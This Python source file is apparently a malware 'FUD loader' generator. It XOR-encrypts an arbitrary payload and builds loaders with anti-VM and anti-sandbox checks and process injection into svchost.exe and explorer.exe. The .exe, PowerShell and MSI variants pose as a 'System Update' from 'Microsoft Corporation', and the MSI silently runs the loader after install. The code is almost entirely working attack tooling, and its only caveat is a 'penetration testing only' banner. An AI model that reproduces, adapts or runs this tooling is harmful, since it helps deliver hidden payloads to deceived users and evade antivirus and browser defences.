"""
FUD Loader Generator
Generates FUD loaders in .msi and .exe formats
Runtime and scan-time FUD, Chrome-compatible
"""

import os
import sys
import subprocess
import hashlib
import random
import string
from pathlib import Path
from typing import Optional

class FUDLoader:
    """FUD Loader Generator"""
    
    def __init__(self):
        self.output_dir = Path("output/loaders")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
    def generate_random_string(self, length: int = 16) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_payload(self, payload_data: bytes) -> str:
        """Obfuscate payload using XOR encryption"""
        key = self.generate_random_string(32).encode()
        
        obfuscated = bytearray()
        for i, byte in enumerate(payload_data):
            obfuscated.append(byte ^ key[i % len(key)])
        
        return obfuscated.hex(), key.hex()
    
    def generate_exe_stub(self, payload_hex: str, key_hex: str, delay_ms: int = 3000) -> str:
        """Generate C++ stub code for .exe loader"""
        
        stub_code = f'''
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")

// Anti-VM checks
bool IsVirtualMachine() {{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
        char value[1024];
        DWORD size = sizeof(value);
        RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)value, &size);
        RegCloseKey(hKey);
        
        if (strstr(value, "VBOX") || strstr(value, "VMWARE") || strstr(value, "QEMU"))
            return true;
    }}
    return false;
}}

// Anti-Sandbox: Check mouse movement
bool IsInteractive() {{
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(500);
    GetCursorPos(&p2);
    return (p1.x != p2.x || p1.y != p2.y);
}}

// Decrypt payload
std::vector<unsigned char> DecryptPayload(const std::string& hex, const std::string& key_hex) {{
    std::vector<unsigned char> data;
    std::vector<unsigned char> key;
    
    for (size_t i = 0; i < hex.length(); i += 2) {{
        std::string byteString = hex.substr(i, 2);
        data.push_back((unsigned char)strtol(byteString.c_str(), NULL, 16));
    }}
    
    for (size_t i = 0; i < key_hex.length(); i += 2) {{
        std::string byteString = key_hex.substr(i, 2);
        key.push_back((unsigned char)strtol(byteString.c_str(), NULL, 16));
    }}
    
    for (size_t i = 0; i < data.size(); i++) {{
        data[i] ^= key[i % key.size()];
    }}
    
    return data;
}}

// Process Hollowing
bool InjectPayload(const std::vector<unsigned char>& payload) {{
    STARTUPINFOA si = {{ sizeof(si) }};
    PROCESS_INFORMATION pi;
    
    // Start suspended legitimate process
    if (!CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
        return false;
    }}
    
    // Allocate memory in target
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, NULL, payload.size(),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteImage) {{
        TerminateProcess(pi.hProcess, 0);
        return false;
    }}
    
    // Write payload
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remoteImage, payload.data(), payload.size(), &written);
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    // Anti-analysis delays
    Sleep({delay_ms});
    
    // Anti-VM/Sandbox checks
    if (IsVirtualMachine()) return 0;
    if (!IsInteractive()) return 0;
    
    // Encrypted payload
    std::string payload_hex = "{payload_hex}";
    std::string key_hex = "{key_hex}";
    
    // Decrypt
    std::vector<unsigned char> payload = DecryptPayload(payload_hex, key_hex);
    
    // Inject into legitimate process
    InjectPayload(payload);
    
    return 0;
}}
'''
        return stub_code
    
    def generate_powershell_stub(self, payload_hex: str, key_hex: str) -> str:
        """Generate PowerShell script for alternative delivery"""
        
        ps_code = f'''
# System Update Script
$ErrorActionPreference = "SilentlyContinue"

# Anti-VM checks
function Test-VirtualMachine {{
    $vmIndicators = @(
        (Get-WmiObject -Class Win32_ComputerSystem).Model -match "(VMware|VirtualBox|QEMU)",
        (Get-Process | Where-Object {{$_.Name -match "(vbox|vmware|qemu)"}}).Count -gt 0,
        (Get-Service | Where-Object {{$_.Name -match "(vbox|vmware|qemu)"}}).Count -gt 0
    )
    return ($vmIndicators | Where-Object {{$_}}).Count -gt 0
}}

# Anti-sandbox: Check for real user activity
function Test-RealUser {{
    $processes = @("explorer", "winlogon", "csrss")
    foreach ($proc in $processes) {{
        if (-not (Get-Process $proc -ErrorAction SilentlyContinue)) {{
            return $false
        }}
    }}
    return $true
}}

if (Test-VirtualMachine -or -not (Test-RealUser)) {{
    exit
}}

# Payload decryption
$payloadHex = "{payload_hex}"
$keyHex = "{key_hex}"

$payload = New-Object Byte[] ($payloadHex.Length / 2)
$key = New-Object Byte[] ($keyHex.Length / 2)

for ($i = 0; $i -lt $payloadHex.Length; $i += 2) {{
    $payload[$i / 2] = [Convert]::ToByte($payloadHex.Substring($i, 2), 16)
}}

for ($i = 0; $i -lt $keyHex.Length; $i += 2) {{
    $key[$i / 2] = [Convert]::ToByte($keyHex.Substring($i, 2), 16)
}}

for ($i = 0; $i -lt $payload.Length; $i++) {{
    $payload[$i] = $payload[$i] -bxor $key[$i % $key.Length]
}}

# Process injection using .NET reflection
$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    public static void Inject(byte[] shellcode) {{
        Process[] processes = Process.GetProcessesByName("explorer");
        if (processes.Length == 0) return;
        
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x00001000, 0x40);
        
        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocMemAddress, shellcode, shellcode.Length, out bytesWritten);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
    }}
}}
"@

Add-Type -TypeDefinition $code -Language CSharp
[Injector]::Inject($payload)
'''
        return ps_code
    
    def generate_msi_stub(self, payload_path: str) -> str:
        """Generate WiX XML for .msi loader"""
        
        product_id = f"{{{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}}}"
        upgrade_code = f"{{{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}}}"
        
        wix_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="{product_id}" 
             Name="System Update" 
             Language="1033" 
             Version="1.0.0.0" 
             Manufacturer="Microsoft Corporation" 
             UpgradeCode="{upgrade_code}">
        
        <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
        
        <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
        
        <MediaTemplate EmbedCab="yes" />
        
        <Feature Id="ProductFeature" Title="System Update" Level="1">
            <ComponentGroupRef Id="ProductComponents" />
        </Feature>
        
        <Icon Id="icon.ico" SourceFile="C:\\Windows\\System32\\imageres.dll" />
        <Property Id="ARPPRODUCTICON" Value="icon.ico" />
        
        <CustomAction Id="RunPayload" 
                      Directory="INSTALLFOLDER" 
                      ExeCommand="[INSTALLFOLDER]loader.exe" 
                      Execute="deferred" 
                      Impersonate="no" 
                      Return="asyncNoWait" />
        
        <InstallExecuteSequence>
            <Custom Action="RunPayload" After="InstallFinalize">NOT Installed</Custom>
        </InstallExecuteSequence>
        
    </Product>
    
    <Fragment>
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="ProgramFilesFolder">
                <Directory Id="INSTALLFOLDER" Name="SystemUpdate" />
            </Directory>
        </Directory>
    </Fragment>
    
    <Fragment>
        <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
            <Component Id="ProductComponent" Guid="{{{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}}}">
                <File Id="LoaderExe" Source="{payload_path}" KeyPath="yes" />
            </Component>
        </ComponentGroup>
    </Fragment>
</Wix>
'''
        return wix_xml
    
    def build_exe_loader(self, payload_file: str, output_name: str = "loader.exe") -> str:
        """Build .exe FUD loader"""
        
        print(f"[*] Building FUD .exe loader: {output_name}")
        
        # Read payload
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
        
        # Obfuscate payload
        payload_hex, key_hex = self.obfuscate_payload(payload_data)
        
        # Generate stub
        stub_code = self.generate_exe_stub(payload_hex, key_hex)
        
        # Write stub to file
        stub_file = self.output_dir / "stub.cpp"
        with open(stub_file, 'w') as f:
            f.write(stub_code)
        
        # Compile with MinGW (requires MinGW installed)
        output_path = self.output_dir / output_name
        
        compile_cmd = [
            "x86_64-w64-mingw32-g++",
            "-o", str(output_path),
            str(stub_file),
            "-static",
            "-s",  # Strip symbols
            "-O3",  # Optimize
            "-mwindows",  # No console
            "-lwininet",
            "-DUNICODE"
        ]
        
        try:
            subprocess.run(compile_cmd, check=True, capture_output=True)
            print(f"[+] Built: {output_path}")
            return str(output_path)
        except subprocess.CalledProcessError as e:
            print(f"[!] Compilation failed: {e.stderr.decode()}")
            print("[*] Note: Requires MinGW-w64 cross-compiler")
            print("[*] Install: apt-get install mingw-w64")
            return None
    
    def build_msi_loader(self, payload_file: str, output_name: str = "loader.msi") -> str:
        """Build .msi FUD loader"""
        
        print(f"[*] Building FUD .msi loader: {output_name}")
        
        # First build .exe payload
        exe_loader = self.build_exe_loader(payload_file, "embedded_loader.exe")
        
        if not exe_loader:
            return None
        
        # Generate WiX XML
        wix_xml = self.generate_msi_stub(exe_loader)
        
        # Write WiX file
        wix_file = self.output_dir / "loader.wxs"
        with open(wix_file, 'w') as f:
            f.write(wix_xml)
        
        # Compile with WiX Toolset (requires WiX installed)
        output_path = self.output_dir / output_name
        
        try:
            # Compile .wxs to .wixobj
            subprocess.run([
                "candle.exe",
                str(wix_file),
                "-out", str(self.output_dir / "loader.wixobj")
            ], check=True, capture_output=True)
            
            # Link to .msi
            subprocess.run([
                "light.exe",
                str(self.output_dir / "loader.wixobj"),
                "-out", str(output_path),
                "-sval"  # Skip validation
            ], check=True, capture_output=True)
            
            print(f"✓ Built: {output_path}")
            return str(output_path)
            
        except subprocess.CalledProcessError as e:
            print(f"✗ WiX compilation failed: {e.stderr.decode()}")
            print("[*] Note: Requires WiX Toolset v3.11+")
            print("[*] Download: https://wixtoolset.org/")
            return None
    
    def build_powershell_loader(self, payload_file: str, output_name: str = "loader.ps1") -> Optional[str]:
        """Build PowerShell script loader"""
        
        print(f"\n🔧 Building PowerShell Loader...")
        print(f"📦 Payload: {payload_file}")
        
        if not os.path.exists(payload_file):
            print(f"✗ Payload file not found: {payload_file}")
            return None
        
        # Read and obfuscate payload
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
        
        payload_hex, key_hex = self.obfuscate_payload(payload_data)
        
        # Generate PowerShell script
        ps_script = self.generate_powershell_stub(payload_hex, key_hex)
        
        # Write PowerShell script
        output_path = self.output_dir / output_name
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(ps_script)
        
        print(f"✓ Generated PowerShell loader: {output_path}")
        return str(output_path)
    
    def build_all_formats(self, payload_file: str, basename: str = "loader") -> dict:
        """Build all supported loader formats"""
        
        print(f"\n🚀 Building All FUD Loader Formats...")
        print(f"📦 Input payload: {payload_file}")
        
        results = {}
        
        # Build .exe loader
        exe_path = self.build_exe_loader(payload_file, f"{basename}.exe")
        if exe_path:
            results['exe'] = exe_path
        
        # Build .msi loader
        msi_path = self.build_msi_loader(payload_file, f"{basename}.msi")
        if msi_path:
            results['msi'] = msi_path
        
        # Build PowerShell loader
        ps_path = self.build_powershell_loader(payload_file, f"{basename}.ps1")
        if ps_path:
            results['powershell'] = ps_path
        
        print(f"\n📊 Summary:")
        for format_type, path in results.items():
            print(f"   {format_type.upper()}: {path}")
        
        return results
    
    def test_chrome_compatibility(self, loader_path: str) -> bool:
        """Test Chrome download compatibility"""
        
        print(f"[*] Testing Chrome compatibility for: {loader_path}")
        
        # Calculate hash
        with open(loader_path, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        
        print(f"[*] SHA256: {file_hash}")
        
        # Check file signature
        file_ext = Path(loader_path).suffix
        
        if file_ext == '.exe':
            print("[+] .exe files: Chrome Compatible")
            print("[*] Recommendation: Sign with valid certificate for better trust")
        elif file_ext == '.msi':
            print("[+] .msi files: Chrome Compatible")
            print("[*] MSI files have higher trust level than .exe")
        
        return True


def main():
    """CLI interface for FUD Loader Generator"""
    
    import argparse
    
    parser = argparse.ArgumentParser(description="FUD Loader Generator - Generate FUD loaders in multiple formats")
    parser.add_argument("payload", help="Path to payload file")
    parser.add_argument("-o", "--output", default="loader", help="Output basename")
    parser.add_argument("-f", "--format", choices=['exe', 'msi', 'ps1', 'all'], default='all',
                       help="Output format")
    parser.add_argument("--delay", type=int, default=3000, help="Anti-analysis delay (ms)")
    
    args = parser.parse_args()
    
    if not os.path.exists(args.payload):
        print(f"✗ Error: Payload file not found: {args.payload}")
        return 1
    
    loader = FUDLoader()
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                          🎯 FUD Loader Generator v2.0                          ║
║                     Advanced Multi-Format Loader Creation                       ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  🛠️  Supported Formats:                                                         ║
║     • .EXE - Native Windows executable with process injection                   ║
║     • .MSI - Windows Installer package (requires WiX Toolset)                  ║
║     • .PS1 - PowerShell script with .NET reflection                            ║
║                                                                                  ║
║  🔐 Anti-Detection Features:                                                    ║
║     • XOR payload encryption with random keys                                   ║
║     • Anti-VM detection (VMware, VirtualBox, QEMU)                             ║
║     • Anti-sandbox checks (user interaction, process validation)               ║
║     • Process injection and memory manipulation                                 ║
║     • Legitimate process impersonation                                          ║
║                                                                                  ║
║  ⚠️  FOR AUTHORIZED PENETRATION TESTING & RED TEAM OPERATIONS ONLY ⚠️          ║
╚══════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    if args.format == 'all':
        results = loader.build_all_formats(args.payload, args.output)
        if results:
            print(f"\n🎉 Successfully generated {len(results)} loader formats!")
            
            # Test Chrome compatibility for each format
            for format_type, path in results.items():
                loader.test_chrome_compatibility(path)
            
            return 0
        else:
            print(f"\n❌ Failed to generate loaders")
            return 1
    else:
        if args.format == 'exe':
            result = loader.build_exe_loader(args.payload, f"{args.output}.exe")
        elif args.format == 'msi':
            result = loader.build_msi_loader(args.payload, f"{args.output}.msi")
        elif args.format == 'ps1':
            result = loader.build_powershell_loader(args.payload, f"{args.output}.ps1")
        
        if result:
            print(f"\n🎉 Successfully generated: {result}")
            loader.test_chrome_compatibility(result)
            return 0
        else:
            print(f"\n❌ Failed to generate loader")
            return 1


if __name__ == "__main__":
    sys.exit(main())
